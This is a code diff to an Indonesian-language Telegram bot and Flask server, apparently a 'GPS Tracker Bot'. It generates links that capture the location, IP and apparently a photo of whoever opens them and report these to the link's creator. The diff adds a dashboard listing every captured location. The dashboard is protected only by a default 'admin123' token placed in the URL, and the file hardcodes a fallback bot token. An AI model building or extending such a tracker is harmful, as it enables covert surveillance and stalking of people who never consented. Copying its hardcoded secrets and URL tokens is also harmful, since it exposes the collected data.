@@ -19,6 +19,7 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Cont
 # ============ CONFIG ============
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8845527390:AAH1RZGR9zuYM7Se_O5171QwgnhQ6gs85dY")
 BASE_URL = os.environ.get("BASE_URL", "http://localhost:5000")
+DASHBOARD_TOKEN = os.environ.get("DASHBOARD_TOKEN", "admin123")
 DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tracker.db")
 
 # ============ DATABASE ============
@@ -55,6 +56,7 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📋 Daftar Link Saya", callback_data="list_links")],
         [InlineKeyboardButton("🔔 Cek Notifikasi", callback_data="check_notif")],
         [InlineKeyboardButton("🗺 Lihat Peta", callback_data="view_map")],
+        [InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}")],
     ]
     text = (
         "🚚 *GPS Tracker Bot*\n"
@@ -222,6 +224,7 @@ async def on_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("📋 Daftar Link Saya", callback_data="list_links")],
             [InlineKeyboardButton("🔔 Cek Notifikasi", callback_data="check_notif")],
             [InlineKeyboardButton("🗺 Lihat Peta", callback_data="view_map")],
+            [InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}")],
         ]
         await q.edit_message_text("🚚 *GPS Tracker Bot*\n━━━━━━━━━━━━━━━━━━━━\n\nPilih menu 👇",
             reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
@@ -262,6 +265,7 @@ async def notify(tracking_id, lat, lon, accuracy, ip, data=None):
         [InlineKeyboardButton("🗺 Google Maps", url=f"https://www.google.com/maps?q={lat},{lon}")],
         [InlineKeyboardButton("📍 Street View", url=f"https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={lat},{lon}")],
         [InlineKeyboardButton("📊 Riwayat", callback_data=f"ev:{tracking_id}")],
+        [InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}")],
     ]
     try:
         photo_data = data.get('photo') if data else None
@@ -280,6 +284,7 @@ async def notify(tracking_id, lat, lon, accuracy, ip, data=None):
 
 # ============ FLASK ============
 app = Flask(__name__, template_folder=os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates"))
+app.config['TEMPLATES_AUTO_RELOAD'] = True
 
 @app.after_request
 def skip_ngrok(response):
@@ -323,6 +328,76 @@ def map_view(tid):
         return render_template("error.html", message="Link tidak ditemukan"), 404
     evs = db_exec("SELECT latitude,longitude,accuracy,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC", (tid,))
     return render_template("map.html", tracking_id=tid, link_info=info[0], events=evs)
+
+@app.route("/dashboard")
+def dashboard():
+    token = request.args.get("token", "")
+    if token != DASHBOARD_TOKEN:
+        return render_template("error.html", message="Akses ditolak. Token dashboard salah atau tidak disertakan."), 403
+    return render_template("dashboard.html", token=token)
+
+@app.route("/api/dashboard")
+def api_dashboard():
+    token = request.args.get("token", "")
+    if token != DASHBOARD_TOKEN:
+        return jsonify({"error": "unauthorized"}), 403
+
+    import datetime
+    from datetime import datetime as dt
+
+    now = dt.now()
+    today_start = now.replace(hour=0, minute=0, second=0, microsecond=0).isoformat()
+
+    total_links = db_exec("SELECT COUNT(*) FROM links")[0][0]
+    active_links = db_exec("SELECT COUNT(*) FROM links WHERE is_active=1")[0][0]
+    total_events = db_exec("SELECT COUNT(*) FROM tracking_events")[0][0]
+    today_events = db_exec("SELECT COUNT(*) FROM tracking_events WHERE timestamp>=?", (today_start,))[0][0]
+    total_users = db_exec("SELECT COUNT(DISTINCT created_by) FROM links")[0][0]
+
+    recent_events = db_exec("""
+        SELECT te.tracking_id, te.latitude, te.longitude, te.accuracy, te.timestamp,
+               l.title as nama
+        FROM tracking_events te
+        LEFT JOIN links l ON te.tracking_id = l.tracking_id
+        ORDER BY te.timestamp DESC LIMIT 20
+    """)
+    recent_events_list = []
+    for row in recent_events:
+        recent_events_list.append({
+            "tracking_id": row[0], "latitude": row[1], "longitude": row[2],
+            "accuracy": row[3], "timestamp": row[4], "nama": row[5] or ""
+        })
+
+    links = db_exec("SELECT tracking_id, title, created_at, is_active FROM links ORDER BY created_at DESC LIMIT 50")
+    links_list = []
+    for row in links:
+        ev_count = db_exec("SELECT COUNT(*) FROM tracking_events WHERE tracking_id=?", (row[0],))[0][0]
+        last_loc = db_exec("SELECT latitude, longitude FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC LIMIT 1", (row[0],))
+        lat, lng = last_loc[0] if last_loc else (None, None)
+        links_list.append({
+            "tracking_id": row[0], "title": row[1],
+            "created_at": row[2], "is_active": bool(row[3]),
+            "event_count": ev_count, "lat": lat, "lng": lng
+        })
+
+    latest_location = None
+    latest = db_exec("""
+        SELECT te.latitude, te.longitude, te.timestamp, te.tracking_id
+        FROM tracking_events te
+        ORDER BY te.timestamp DESC LIMIT 1
+    """)
+    if latest:
+        latest_location = {"lat": latest[0][0], "lng": latest[0][1], "ts": latest[0][2], "tid": latest[0][3]}
+
+    return jsonify({
+        "total_links": total_links, "active_links": active_links,
+        "total_events": total_events, "today_events": today_events,
+        "total_users": total_users,
+        "recent_events": recent_events_list,
+        "links": links_list,
+        "latest_location": latest_location,
+        "generated_at": now.strftime("%Y-%m-%d %H:%M:%S")
+    })
 
 # ============ MAIN ============
 def main():
